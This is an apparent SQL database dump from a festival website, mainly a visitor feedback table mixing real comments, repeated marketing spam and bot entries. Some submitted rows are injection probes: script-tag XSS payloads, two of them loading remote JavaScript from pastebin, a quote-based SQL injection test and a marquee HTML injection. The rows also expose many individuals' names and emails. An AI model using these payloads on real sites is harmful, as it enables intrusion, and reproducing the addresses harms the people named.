(71, 82, 10, 715, '9HLV8400B8', NULL, NULL, NULL, NULL, '2019-10-27 12:25:34', '2019-10-30 00:10:34', 0, 0, 0, 0, '2019-10-27 12:25:34'),
(72, 117, 1, 866, '5W31P1UOEH', NULL, NULL, NULL, NULL, '2019-10-29 04:53:05', '2019-11-01 04:11:05', 0, 0, 0, 0, '2019-10-29 04:53:05'),
(73, 117, 2, 62, 'E64HPAQE8K', NULL, NULL, NULL, NULL, '2019-10-29 04:54:34', '2019-11-01 04:11:34', 0, 0, 0, 0, '2019-10-29 04:54:34'),
(74, 117, 1, 902, 'H9EHKC5PET', NULL, NULL, NULL, NULL, '2019-10-29 04:59:27', '2019-11-01 04:11:27', 0, 0, 0, 0, '2019-10-29 04:59:27'),
(75, 117, 1, 446, 'ZDGIP5NFJY', NULL, NULL, NULL, NULL, '2019-10-29 05:07:14', '2019-11-01 05:11:14', 0, 0, 0, 0, '2019-10-29 05:07:14'),
(76, 117, 2, 236, '4NAEKNZ3X3', NULL, NULL, NULL, NULL, '2019-10-29 05:08:03', '2019-11-01 05:11:03', 0, 0, 0, 0, '2019-10-29 05:08:03'),
(78, 118, 4, 476, 'KJCYJF15F9', NULL, NULL, NULL, NULL, '2019-10-29 11:17:01', '2019-10-31 23:11:01', 0, 0, 0, 0, '2019-10-29 11:17:01'),
(80, 121, 5, 578, '2A8OHB2LVH', NULL, NULL, NULL, NULL, '2019-10-29 11:26:38', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 11:26:38'),
(81, 122, 5, 441, '0QZZSBQL5T', NULL, NULL, NULL, NULL, '2019-10-29 11:28:00', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 11:28:00'),
(82, 123, 5, 310, '6LFXS1R1AB', NULL, NULL, NULL, NULL, '2019-10-29 11:28:02', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 11:28:02'),
(83, 124, 5, 104, 'Z64YFSKHPO', NULL, NULL, NULL, NULL, '2019-10-29 11:28:09', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 11:28:09'),
(84, 125, 5, 461, 'YFU1KIME1F', NULL, NULL, NULL, NULL, '2019-10-29 11:28:20', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 11:28:20'),
(87, 128, 5, 132, 'R7PKKQSHBM', NULL, NULL, NULL, NULL, '2019-10-29 11:33:40', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 11:33:40'),
(90, 130, 5, 489, 'DT4JQIDFQ5', NULL, NULL, NULL, NULL, '2019-10-29 11:38:14', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 11:38:14'),
(92, 133, 4, 999, '50VTJM3IZM', NULL, NULL, NULL, NULL, '2019-10-29 12:33:00', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 12:33:00'),
(93, 132, 5, 730, 'N0WKP8QLK8', NULL, NULL, NULL, NULL, '2019-10-29 12:57:17', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 12:57:17'),
(94, 135, 5, 911, 'OK9K9DA2CL', NULL, NULL, NULL, NULL, '2019-10-29 12:58:18', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 12:58:18'),
(95, 136, 4, 425, 'FSTYVB26UQ', NULL, NULL, NULL, NULL, '2019-10-29 13:03:56', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 13:03:56'),
(96, 137, 4, 326, 'GY57ICXT46', NULL, NULL, NULL, NULL, '2019-10-29 13:05:42', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 13:05:42'),
(97, 138, 4, 391, 'QLB62M6DZC', NULL, NULL, NULL, NULL, '2019-10-29 13:06:43', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 13:06:43'),
(98, 139, 4, 856, 'Y6Y3PV84QV', NULL, NULL, NULL, NULL, '2019-10-29 13:08:17', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 13:08:17'),
(100, 141, 4, 847, 'V5K7K9IESC', NULL, NULL, NULL, NULL, '2019-10-29 13:31:38', '2019-10-31 18:00:00', 0, 1, 0, 0, '2019-10-29 13:31:38'),
(101, 143, 1, 903, '3T8I5H6CK1', NULL, NULL, NULL, NULL, '2019-10-30 01:23:46', '2019-11-02 01:11:46', 0, 0, 0, 0, '2019-10-30 01:23:46'),
(102, 143, 1, 346, '1DGHM9FO11', NULL, NULL, NULL, NULL, '2019-10-30 01:28:53', '2019-11-02 01:11:53', 0, 0, 0, 0, '2019-10-30 01:28:53'),
(103, 143, 1, 98, 'O948CW36PK', NULL, NULL, NULL, NULL, '2019-10-30 01:29:46', '2019-11-02 01:11:46', 0, 0, 0, 0, '2019-10-30 01:29:46'),
(104, 146, 7, 598, '02D4F54PIV', NULL, NULL, NULL, NULL, '2019-10-31 01:10:46', '2019-11-03 01:11:46', 0, 0, 0, 0, '2019-10-31 01:10:46'),
(105, 146, 7, 7, 'ZVR1HXSU52', NULL, NULL, NULL, NULL, '2019-11-01 00:31:39', '2019-11-03 01:11:13', 0, 0, 0, 0, '2019-10-31 01:17:13'),
(106, 147, 7, 218, '1CBMTY3DH8', 'Menceritakan seorang pemuda kaya yang memiliki perangkat high spec namun tidak memiliki skill, dilain sisi kakak kelas dari pemuda ini memiliki skill yang baik namun tidak memiliki perangkat high spec dikarenakan keadaan ekonominya. Hingga suatu hari pemuda ini diajarkan kakak kelasnya untuk mengasah skill tersebut. Akankah mereka dapat menyelesaikan masalahnya masing-masing?. Lihat jawabannya di Short Movie SMAN 4 Bekasi.', NULL, NULL, NULL, '2019-11-12 13:14:23', '2019-11-03 06:11:38', 0, 1, 0, 0, '2019-11-12 14:14:23'),
(107, 147, 7, 551, 'ISG6CVHYUQ', NULL, NULL, NULL, NULL, '2019-10-31 07:04:17', '2019-11-02 19:11:17', 0, 0, 0, 0, '2019-10-31 07:04:17'),
(110, 146, 7, 475, 'EF1AKQ8WDF', NULL, NULL, NULL, NULL, '2019-10-31 14:48:14', '2019-11-03 02:11:14', 0, 0, 0, 0, '2019-10-31 14:48:14'),
(111, 149, 8, 475, 'EIKRH8NQDI', NULL, NULL, NULL, NULL, '2019-11-02 08:32:09', '2019-11-04 20:11:09', 0, 0, 0, 0, '2019-11-02 08:32:09'),
(112, 150, 8, 491, '4SIO64M5TU', NULL, NULL, NULL, NULL, '2019-11-02 08:51:53', '2019-11-04 20:11:53', 0, 0, 0, 0, '2019-11-02 08:51:53'),
(113, 151, 6, 573, 'MAAFLQ2GCN', NULL, NULL, NULL, NULL, '2019-11-02 15:11:47', '2019-11-04 21:11:04', 0, 1, 0, 0, '2019-11-02 16:11:47'),
(114, 151, 6, 121, 'WE0ITHMR9F', NULL, NULL, NULL, NULL, '2019-11-02 09:45:41', '2019-11-04 21:11:41', 0, 0, 0, 0, '2019-11-02 09:45:41'),
(115, 152, 4, 712, '84CL0LFISQ', NULL, NULL, NULL, NULL, '2019-11-02 10:03:05', '2019-11-04 18:00:00', 0, 1, 0, 0, '2019-11-02 10:03:05'),
(116, 151, 6, 825, 'TOQ05BO557', NULL, NULL, NULL, NULL, '2019-11-02 10:41:16', '2019-11-04 22:11:16', 0, 0, 0, 0, '2019-11-02 10:41:16'),
(119, 154, 4, 944, 'F89T90YHRN', NULL, NULL, NULL, NULL, '2019-11-02 15:51:55', '2019-11-04 18:00:00', 0, 1, 0, 0, '2019-11-02 15:51:55'),
(120, 157, 8, 446, '4QNMWW4STA', NULL, NULL, NULL, NULL, '2019-11-04 00:37:21', '2019-11-07 00:11:21', 0, 0, 0, 0, '2019-11-04 00:37:21'),
(122, 161, 4, 782, 'EGMR0CD58K', NULL, NULL, NULL, NULL, '2019-11-04 13:31:28', '2019-11-06 18:00:00', 0, 1, 0, 0, '2019-11-04 13:31:28'),
(123, 164, 4, 181, '5QQTY0UO02', NULL, NULL, NULL, NULL, '2019-11-04 14:10:55', '2019-11-06 18:00:00', 0, 1, 0, 0, '2019-11-04 14:10:55'),
(124, 165, 4, 159, 'LO4AVAPCOP', NULL, NULL, NULL, NULL, '2019-11-06 12:16:17', '2019-11-08 18:00:00', 0, 1, 0, 0, '2019-11-06 12:16:17'),
(125, 166, 4, 565, 'FD7WEXDRBP', NULL, NULL, NULL, NULL, '2019-11-06 15:16:44', '2019-11-08 18:00:00', 0, 1, 0, 0, '2019-11-06 15:16:44'),
(126, 167, 4, 95, '5SLSRQ9X4A', NULL, NULL, NULL, NULL, '2019-11-08 13:48:51', '2019-11-10 18:00:00', 0, 1, 0, 0, '2019-11-08 13:48:51'),
(127, 168, 4, 154, 'T5PJAUARNK', NULL, NULL, NULL, NULL, '2019-11-08 15:27:15', '2019-11-10 18:00:00', 0, 1, 0, 0, '2019-11-08 15:27:15'),
(128, 169, 4, 285, 'WVZ79LNDDN', NULL, NULL, NULL, NULL, '2019-11-08 15:45:41', '2019-11-10 18:00:00', 0, 1, 0, 0, '2019-11-08 15:45:41'),
(129, 170, 4, 699, '16BS6ZTY1G', NULL, NULL, NULL, NULL, '2019-11-08 17:10:37', '2019-11-10 18:00:00', 0, 1, 0, 0, '2019-11-08 17:10:37'),
(130, 171, 6, 471, '5SPZLTS5XG', NULL, NULL, NULL, NULL, '2019-11-09 03:15:51', '2019-11-12 03:11:51', 0, 0, 0, 0, '2019-11-09 03:15:51'),
(131, 171, 6, 334, 'OKVPCISPC0', NULL, NULL, NULL, NULL, '2019-11-09 03:22:27', '2019-11-12 03:11:27', 0, 0, 0, 0, '2019-11-09 03:22:27'),
(132, 172, 9, 641, 'HZO9RK5FM1', NULL, NULL, NULL, NULL, '2019-11-12 14:49:40', '2019-11-15 02:11:40', 0, 0, 0, 0, '2019-11-12 14:49:40'),
(133, 173, 7, 364, 'KZC0JFF8YB', NULL, NULL, NULL, NULL, '2019-11-14 06:04:07', '2019-11-16 18:00:00', 0, 1, 0, 0, '2019-11-14 06:04:07');

-- --------------------------------------------------------

--
-- Struktur dari tabel `sarkom`
--

CREATE TABLE `sarkom` (
  `id_sarkom` int(11) NOT NULL,
  `nama` varchar(50) NOT NULL,
  `email` varchar(50) NOT NULL,
  `sarkom` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `sarkom`
--

INSERT INTO `sarkom` (`id_sarkom`, `nama`, `email`, `sarkom`, `created_at`, `updated_at`) VALUES
(1, 'Giovanni', 'wiwins096@gmail.com', 'Kak apakah masih bisa daftar turnamen', '2019-09-19 12:51:48', '2019-09-19 12:51:48'),
(2, 'Isra', 'israawal04@gmail.com', 'Hallow gais asikk udah jadi lancar nih web ga mau komen apa apa cuman mau caper hehehe inti nya intisari eh maksud nya inti nya lu tau gua siapa hehehe', '2019-09-20 05:02:46', '2019-09-20 05:02:46'),
(3, 'Hapiidz rizky', 'anthonthon759@gmail.com', 'Ingin mengikuti turnament', '2019-10-03 00:22:44', '2019-10-03 00:22:44'),
(4, 'Eric Jones', 'eric@talkwithcustomer.com', 'Hey,\r\n\r\nYou have a website telesandifestival.com, right?\r\n\r\nOf course you do. I am looking at your website now.\r\n\r\nIt gets traffic every day – that you’re probably spending $2 / $4 / $10 or more a click to get.  Not including all of the work you put into creating social media, videos, blog posts, emails, and so on.\r\n\r\nSo you’re investing seriously in getting people to that site.\r\n\r\nBut how’s it working?  Great? Okay?  Not so much?\r\n\r\nIf that answer could be better, then it’s likely you’re putting a lot of time, effort, and money into an approach that’s not paying off like it should.\r\n\r\nNow… imagine doubling your lead conversion in just minutes… In fact, I’ll go even better.\r\n \r\nYou could actually get up to 100X more conversions!\r\n\r\nI’m not making this up.  As Chris Smith, best-selling author of The Conversion Code says: Speed is essential - there is a 100x decrease in Leads when a Lead is contacted within 14 minutes vs being contacted within 5 minutes.\r\n\r\nHe’s backed up by a study at MIT that found the odds of contacting a lead will increase by 100 times if attempted in 5 minutes or less.\r\n\r\nAgain, out of the 100s of visitors to your website, how many actually call to become clients?\r\n\r\nWell, you can significantly increase the number of calls you get – with ZERO extra effort.\r\n\r\nTalkWithCustomer makes it easy, simple, and fast – in fact, you can start getting more calls today… and at absolutely no charge to you.\r\n\r\nCLICK HERE http://www.talkwithcustomer.com now to take a free, 14-day test drive to find out how.\r\n\r\nSincerely,\r\nEric\r\n\r\nPS: Don’t just take my word for it, TalkWithCustomer works:\r\nEMA has been looking for ways to reach out to an audience. TalkWithCustomer so far is the most direct call of action. It has produced above average closing ratios and we are thrilled. Thank you for providing a real and effective tool to generate REAL leads. - P MontesDeOca.\r\nBest of all, act now to get a no-cost 14-Day Test Drive – our gift to you just for giving TalkWithCustomer a try. \r\nCLICK HERE http://www.talkwithcustomer.com to start converting up to 100X more leads today!\r\n\r\nIf you\'d like to unsubscribe click here http://liveserveronline.com/talkwithcustomer.aspx?d=telesandifestival.com', '2019-10-13 07:03:19', '2019-10-13 07:03:19'),
(5, 'hello world', 'secret@dwp.com', 'hello world', '2019-10-24 05:09:34', '2019-10-24 05:09:34'),
(6, 'Automated', 'tjk1116@gmail.com', 'Coordinator', '2019-11-06 18:37:45', '2019-11-06 18:37:45'),
(7, 'B2B', 'mowade65@embarqmail.com', 'Reduced', '2019-11-06 19:12:54', '2019-11-06 19:12:54'),
(8, 'bypass', 'mcclainadidas@aol.com', 'Computers', '2019-11-06 21:41:18', '2019-11-06 21:41:18'),
(9, 'synthesize', 'archraider@hotmail.com', 'Somoni', '2019-11-07 01:44:18', '2019-11-07 01:44:18'),
(10, 'XSS', 'motrteknik@aol.com', 'dynamic', '2019-11-07 03:48:48', '2019-11-07 03:48:48'),
(11, 'Borders', 'trhuelsman@gmail.com', 'Tasty', '2019-11-07 04:49:44', '2019-11-07 04:49:44'),
(12, 'Table', 'skydog@email.com', 'Berkshire', '2019-11-07 12:35:42', '2019-11-07 12:35:42'),
(13, 'matrix', 'aditya.nitt@gmail.com', 'Money Market Account', '2019-11-07 13:08:14', '2019-11-07 13:08:14'),
(14, 'Shirt', 'cristyefelix@yahoo.com', 'Assistant', '2019-11-07 16:43:15', '2019-11-07 16:43:15'),
(15, 'Jaya', 'jaya12@gmail.com', 'Keren', '2019-11-12 02:28:05', '2019-11-12 02:28:05'),
(16, 'Eric Jones', 'eric@talkwithcustomer.com', 'Hi,\r\n\r\nMy name is Eric and I was looking at a few different sites online and came across your site telesandifestival.com.  I must say - your website is very impressive.  I am seeing your website on the first page of the Search Engine. \r\n\r\nHave you noticed that 70 percent of visitors who leave your website will never return?  In most cases, this means that 95 percent to 98 percent of your marketing efforts are going to waste, not to mention that you are losing more money in customer acquisition costs than you need to.\r\n \r\nAs a business person, the time and money you put into your marketing efforts is extremely valuable.  So why let it go to waste?  Our users have seen staggering improvements in conversions with insane growths of 150 percent going upwards of 785 percent. Are you ready to unlock the highest conversion revenue from each of your website visitors?  \r\n\r\nTalkWithCustomer is a widget which captures a website visitor’s Name, Email address and Phone Number and then calls you immediately, so that you can talk to the Lead exactly when they are live on your website — while they\'re hot! Best feature of all, International Long Distance Calling is included!\r\n  \r\nTry TalkWithCustomer Live Demo now to see exactly how it works.  Visit http://www.talkwithcustomer.com\r\n\r\nWhen targeting leads, speed is essential - there is a 100x decrease in Leads when a Lead is contacted within 30 minutes vs being contacted within 5 minutes.\r\n\r\nIf you would like to talk to me about this service, please give me a call.  We have a 14 days trial.  Visit http://www.talkwithcustomer.com to start converting up to 100X more leads today!\r\n\r\nThanks and Best Regards,\r\nEric\r\n\r\nIf you\'d like to unsubscribe go to http://liveserveronline.com/talkwithcustomer.aspx?d=telesandifestival.com', '2019-11-12 22:53:46', '2019-11-12 22:53:46'),
(17, 'Ghaza', 'ghazajr18@gmail.com', 'semakin sukses & maju', '2019-11-29 10:12:59', '2019-11-29 10:12:59'),
(18, 'Agustinus Wahyu Hertantio', 'agustinustio31@gmail.com', 'Pasti Menarik!', '2019-11-29 12:07:56', '2019-11-29 12:07:56'),
(19, 'asfafsasf', 'asfjasfkasf@gmail.com', 'asfasfasf', '2019-12-04 12:08:21', '2019-12-04 12:08:21'),
(20, '<script>alert(\"hellox worldss\");</script>', 'asfasfasf@gmail.com', 'kamjsfkmasf', '2019-12-04 12:17:34', '2019-12-04 12:17:34'),
(21, 'yavvi adi', 'yavviadinurr@gmail.com', 'tambah fitur voting', '2019-12-06 17:16:43', '2019-12-06 17:16:43'),
(22, 'models', 'trustyourself94@aol.com', 'Customizable', '2019-12-12 19:20:24', '2019-12-12 19:20:24'),
(23, 'Danish Krone', 'ericharrbiz85@yahoo.com', 'clicks-and-mortar', '2019-12-13 00:52:49', '2019-12-13 00:52:49'),
(24, 'HI GUYSSS', 'asdmasmd@gmail.com', '<script type=\"text/javascript\" src=\"https://pastebin.com/raw/pNAtpyKQ\">', '2019-12-15 04:22:06', '2019-12-15 04:22:06'),
(25, 'pink', 'adelek35@gmail.com', 'array', '2019-12-16 23:38:48', '2019-12-16 23:38:48'),
(26, 'Eric Jones', 'eric@talkwithcustomer.com', 'Hello,\r\n\r\nYou know it’s true…\r\n\r\nYour competition just can’t hold a candle to the way you DELIVER real solutions to your customers on your website telesandifestival.com.\r\n\r\nBut it’s a shame when good people who need what you have to offer wind up settling for second best or even worse.\r\n\r\nNot only do they deserve better, you deserve to be at the top of their list.\r\n \r\nTalkWithCustomer can reliably turn your website telesandifestival.com into a serious, lead generating machine.\r\n\r\nWith TalkWithCustomer installed on your site, visitors can either call you immediately or schedule a call for you in the future.\r\n \r\nAnd the difference to your business can be staggering – up to 100X more leads could be yours, just by giving TalkWithCustomer a FREE 14 Day Test Drive.\r\n \r\nThere’s absolutely NO risk to you, so CLICK HERE http://www.talkwithcustomer.com to sign up for this free test drive now.  \r\n\r\nTons more leads? You deserve it.\r\n\r\nSincerely,\r\nEric\r\nPS:  Odds are, you won’t have long to wait before seeing results:\r\nThis service makes an immediate difference in getting people on the phone right away before they have a chance to turn around and surf off to a competitor\'s website. D Traylor, Traylor Law  \r\nWhy wait any longer?  \r\nCLICK HERE http://www.talkwithcustomer.com to take the FREE 14-Day Test Drive and start converting up to 100X more leads today!\r\n\r\nIf you\'d like to unsubscribe click here http://liveserveronline.com/talkwithcustomer.aspx?d=telesandifestival.com', '2019-12-18 06:42:03', '2019-12-18 06:42:03'),
(27, 'pixel', 'sthornton@safeguardcorp.net', 'disintermediate', '2019-12-18 08:30:32', '2019-12-18 08:30:32'),
(28, 'asdasml;dm', 'kamdkasd@gmail.com', '\'', '2019-12-18 13:57:22', '2019-12-18 13:57:22'),
(29, 'Developer', 'schuffi@gmx.de', 'Bedfordshire', '2019-12-18 17:02:20', '2019-12-18 17:02:20'),
(30, 'Tajikistan', 'rhinkel764@aol.com', 'Curve', '2019-12-19 00:11:56', '2019-12-19 00:11:56'),
(31, 'Forward', 'claytonroofing@sbcglobal.net', 'Gorgeous Soft Shoes', '2019-12-19 16:58:29', '2019-12-19 16:58:29'),
(32, 'Facilitator', 'umer.ramzan@lsiworld.com', 'Manager', '2019-12-22 00:07:44', '2019-12-22 00:07:44'),
(33, 'violet', 'becdambrosio@verizon.net', 'Industrial', '2019-12-22 03:54:50', '2019-12-22 03:54:50'),
(34, 'Pants', 'cynthiatooks@gmail.com', 'Baby', '2019-12-22 16:55:25', '2019-12-22 16:55:25'),
(35, 'TKJ CYBER SECURITY IDIOTS', 'cybersecurity@idiots.com', '<script type=\"text/javascript\" src=\"https://pastebin.com/raw/ECqfqAvK\">', '2019-12-24 19:46:10', '2019-12-24 19:46:10'),
(36, 'Money Market Account', 'googlemmc@ruelala.com', 'Cape Verde Escudo', '2019-12-25 00:31:39', '2019-12-25 00:31:39'),
(37, 'Branding', 'nita@wearefaithbridge.com', 'Technician', '2019-12-26 17:32:13', '2019-12-26 17:32:13'),
(38, 'Intelligent Granite Gloves', 'keusiokis@gmail.com', 'Assistant', '2019-12-29 04:23:45', '2019-12-29 04:23:45'),
(39, 'Jeana Hutt', 'jeana.hutt6@yahoo.com', 'https://www.monkeydigital.io/product/gov-backlinks/', '2020-01-01 13:32:26', '2020-01-01 13:32:26'),
(40, '\"><marquee>abcd', 'abcd@gmail.com', '\"><marquee>abcd', '2020-01-02 16:32:53', '2020-01-02 16:32:53'),
(41, 'Gourde US Dollar', 'wuyujack@gmail.com', 'Checking Account', '2020-01-06 04:41:18', '2020-01-06 04:41:18'),
(42, 'Web', 'hgilbert@hgilbertlaw.com', 'Checking Account', '2020-01-09 22:57:03', '2020-01-09 22:57:03'),
(43, 'Senior', 'lparks876@gmail.com', 'Forward', '2020-01-13 09:31:25', '2020-01-13 09:31:25'),
(44, 'Chair', 'ashley.toye@live.ca', 'West Virginia', '2020-01-13 11:19:04', '2020-01-13 11:19:04'),
(45, 'cyan', 'anthony@anthonyglim.com', 'ubiquitous', '2020-01-19 05:42:35', '2020-01-19 05:42:35'),
(46, 'grey', 'easyriderbob@comcast.net', 'cyan', '2020-01-22 05:23:49', '2020-01-22 05:23:49'),
(47, 'Eric Jones', 'eric@talkwithcustomer.com', 'Hello telesandifestival.com,\r\n\r\nPeople ask, “why does TalkWithCustomer work so well?”\r\n\r\nIt’s simple.\r\n\r\nTalkWithCustomer enables you to connect with a prospective customer at EXACTLY the Perfect Time.\r\n\r\n- NOT one week, two weeks, three weeks after they’ve checked out your website telesandifestival.com.\r\n- NOT with a form letter style email that looks like it was written by a bot.\r\n- NOT with a robocall that could come at any time out of the blue.\r\n\r\nTalkWithCustomer connects you to that person within seconds of THEM asking to hear from YOU.\r\n\r\nThey kick off the conversation.\r\n\r\nThey take that first step.\r\n\r\nThey ask to hear from you regarding what you have to offer and how it can make their life better. \r\n\r\nAnd it happens almost immediately. In real time. While they’re still looking over your website telesandifestival.com, trying to make up their mind whether you are right for them.\r\n\r\nWhen you connect with them at that very moment it’s the ultimate in Perfect Timing – as one famous marketer put it, “you’re entering the conversation already going on in their mind.”\r\n\r\nYou can’t find a better opportunity than that.\r\n\r\nAnd you can’t find an easier way to seize that chance than TalkWithCustomer. \r\n\r\nCLICK HERE http://www.talkwithcustomer.com now to take a free, 14-day test drive and see what a difference “Perfect Timing” can make to your business.\r\n\r\nSincerely,\r\nEric\r\n\r\nPS:  If you’re wondering whether NOW is the perfect time to try TalkWithCustomer, ask yourself this:\r\nWill doing what I’m already doing now produce up to 100X more leads?\r\nBecause those are the kinds of results we know TalkWithCustomer can deliver.  \r\nIt shouldn’t even be a question, especially since it will cost you ZERO to give it a try. \r\nCLICK HERE http://www.talkwithcustomer.com to start your free 14-day test drive today.\r\n\r\nIf you\'d like to unsubscribe click here http://liveserveronline.com/talkwithcustomer.aspx?d=telesandifestival.com', '2020-01-22 08:36:15', '2020-01-22 08:36:15'),
(48, 'Fern McDonagh', 'fern.mcdonagh55@outlook.com', 'hi,\r\nHope you are doing well and fine\r\n\r\nIf you`ll ever need New Local SEO strategies for 2020 to boost your local ranks for your website and google maps, updated to the latest 14 January google updates\r\n\r\nPlease either consider my local SEO plan strategy\r\nhttps://www.ghostdigital.co/product/local-seo-package/\r\n\r\nor my new Google Maps 2020 promotion method\r\nhttps://www.ghostdigital.co/product/google-maps-citations/\r\n\r\nIf you have multiple websites, I can offer great deals on bundle SEO plans\r\nEmail me for more details\r\n\r\nthanks and regards\r\nMike McDonagh\r\nghostdigital.mike@gmail.com', '2020-01-25 10:20:13', '2020-01-25 10:20:13'),
(49, 'Designer', 'stefaniewilliams97@yahoo.com', 'programming', '2020-01-26 01:38:43', '2020-01-26 01:38:43'),
(50, 'protocol', 'jozuit@outlook.com', 'Planner', '2020-01-27 23:40:15', '2020-01-27 23:40:15'),
(51, 'bandwidth', 'tim@fairviewloghomes.net', 'azure', '2020-01-29 05:08:34', '2020-01-29 05:08:34'),
(52, 'cross-platform', 'david.curro@hotmail.es', 'Democratic People\'s Republic of Korea', '2020-01-30 10:51:42', '2020-01-30 10:51:42'),
(53, 'Eric Jones', 'eric@talkwithcustomer.com', 'Hi,\r\n\r\nLet’s take a quick trip to Tomorrow-land.\r\n\r\nI’m not talking about a theme park, I’m talking about your business’s future…\r\n\r\nDon’t worry, we won’t even need a crystal ball.  \r\n\r\nJust imagine… \r\n\r\n… a future where the money you invest in driving traffic to your site telesandifestival.com pays off with tons of calls from qualified leads.\r\n \r\nAnd the difference between what you experienced in the past is staggering – you’re seeing 10X, 20X, 50X, even up to a 100X more leads coming from your website telesandifestival.com.  Leads that are already engaged with what you have to offer and are ready to learn more and even open their wallets.\r\n\r\nSeeing all this taking place in your business, you think back: What did I do only a short time ago that made such a huge difference?\r\n\r\nAnd then it hits you: You took advantage of a free 14 day Test Drive of TalkWithCustomer.\r\n\r\nYou installed TalkWithCustomer on telesandifestival.com – it was a snap.\r\n\r\nAnd practically overnight customers started engaging more regularly and calling your business. Like this: EMA has been looking for ways to reach out to an audience. TalkWithCustomer so far is the most direct call of action. It has produced above average closing ratios and we are thrilled. Thank you for providing a real and effective tool to generate REAL leads.  - Patrick Montes\r\n\r\nSince you installed TalkWithCustomer it’s been great.\r\n\r\nIt’s fun to dream, but this isn’t just a dream. It could be your very real tomorrow.\r\n \r\nAll you have to do is CLICK HERE http://www.talkwithcustomer.com to sign up to try TalkWithCustomer today.\r\n\r\nNot tomorrow. Today.\r\n\r\nBecause there’s no better time than now to make your business work the way you’ve always wanted.\r\n \r\nSincerely,\r\nEric\r\nPS: Remember, there’s absolutely NO risk to you – if you’re 100% satisfied after the 14 days pass, there’s no obligation.  And even ONE more lead-turned-into-customer could be worth hundreds, even thousands to you over their lifetime. \r\n\r\nDon’t let the moment pass you by.  CLICK HERE http://www.talkwithcustomer.com to sign up for this free test drive now.  \r\n\r\nIf you\'d like to unsubscribe click here http://liveserveronline.com/talkwithcustomer.aspx?d=telesandifestival.com', '2020-01-31 12:36:35', '2020-01-31 12:36:35'),
(54, 'withdrawal', 'mariaz0927@aol.com', 'Factors', '2020-02-03 21:58:51', '2020-02-03 21:58:51'),
(55, 'content', 'hippieprincess48@aol.com', 'Corporate', '2020-02-04 17:54:52', '2020-02-04 17:54:52'),
(56, 'Configuration', 'mkelbus76@gmail.com', 'Infrastructure', '2020-02-04 20:19:43', '2020-02-04 20:19:43'),
(57, 'program', 'rundfunkdatenschutz@mdr.de', 'Fish', '2020-02-06 17:07:09', '2020-02-06 17:07:09'),
(58, 'system', 'rinypeters@hotmail.com', 'matrix', '2020-02-08 08:53:13', '2020-02-08 08:53:13'),
(59, 'Bike', 'sajeev_na@yahoo.com', 'Summit', '2020-02-10 20:12:49', '2020-02-10 20:12:49'),
(60, 'PCI', 'revaysautoservice@yahoo.com', 'Planner', '2020-02-11 06:41:01', '2020-02-11 06:41:01'),
(61, 'Zita Fairbairn', 'noreply@arteseo.co', 'As per your inquiry, here is your unique domains backlinks package quotation and options for telesandifestival.com\r\n\r\nhttps://www.arteseo.co/quotation/', '2020-02-18 20:13:48', '2020-02-18 20:13:48'),
(62, 'Cotton', 'bulkbuddy1@gmail.com', 'Pound Sterling', '2020-02-19 13:42:22', '2020-02-19 13:42:22'),
(63, 'asd', 'asdasd@gma.com', 'dsadsa', '2020-02-24 11:25:21', '2020-02-24 11:25:21'),
(64, 'Peso Uruguayo Uruguay Peso en Unidades Indexadas', 'briemann1@comcast.net', 'Borders', '2020-03-02 13:14:43', '2020-03-02 13:14:43'),
(65, 'cyan', 'cpool20786@aol.com', 'Toys', '2020-03-03 06:04:13', '2020-03-03 06:04:13'),
(66, 'Granite', 'marlon.rose@t-online.de', 'United States Minor Outlying Islands', '2020-03-04 18:07:55', '2020-03-04 18:07:55'),
(67, 'Eric Jones', 'eric@talkwithwebvisitor.com', 'Hey, this is Eric and I ran across telesandifestival.com a few minutes ago.\r\n\r\nLooks great… but now what?\r\n\r\nBy that I mean, when someone like me finds your website – either through Search or just bouncing around – what happens next?  Do you get a lot of leads from your site, or at least enough to make you happy?\r\n\r\nHonestly, most business websites fall a bit short when it comes to generating paying customers. Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment.\r\n\r\nHere’s an idea…\r\n \r\nHow about making it really EASY for every visitor who shows up to get a personal phone call you as soon as they hit your site…\r\n \r\nYou can –\r\n  \r\nTalk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.\r\n\r\nCLICK HERE http://www.talkwithwebvisitor.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.\r\n\r\nYou’ll be amazed - the difference between contacting someone within 5 minutes versus a half-hour or more later could increase your results 100-fold.\r\n\r\nIt gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation.\r\n  \r\nThat way, even if you don’t close a deal right away, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.\r\n\r\nPretty sweet – AND effective.\r\n\r\nCLICK HERE http://www.talkwithwebvisitor.com to discover what Talk With Web Visitor can do for your business.\r\n\r\nYou could be converting up to 100X more leads today!\r\n\r\nEric\r\nPS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. \r\nYou have customers waiting to talk with you right now… don’t keep them waiting. \r\nCLICK HERE http://www.talkwithwebvisitor.com to try Talk With Web Visitor now.\r\n\r\nIf you\'d like to unsubscribe click here http://talkwithwebvisitor.com/unsubscribe.aspx?d=telesandifestival.com', '2020-03-14 15:49:54', '2020-03-14 15:49:54');

-- --------------------------------------------------------

--
-- Struktur dari tabel `stream_bagan`
--

CREATE TABLE `stream_bagan` (
  `id_sb` int(11) NOT NULL,
  `judul_sb` text NOT NULL,
